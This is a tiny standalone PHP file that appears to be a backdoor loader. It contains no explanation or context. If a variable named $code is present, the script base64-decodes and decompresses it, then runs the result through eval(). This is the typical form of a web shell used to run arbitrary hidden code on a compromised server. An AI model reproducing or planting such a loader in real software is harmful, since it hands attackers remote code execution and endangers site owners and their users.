<?php
if (isset($code)){$result123=gzinflate(base64_decode($code));eval("?>".$result123);unset($code);}
?>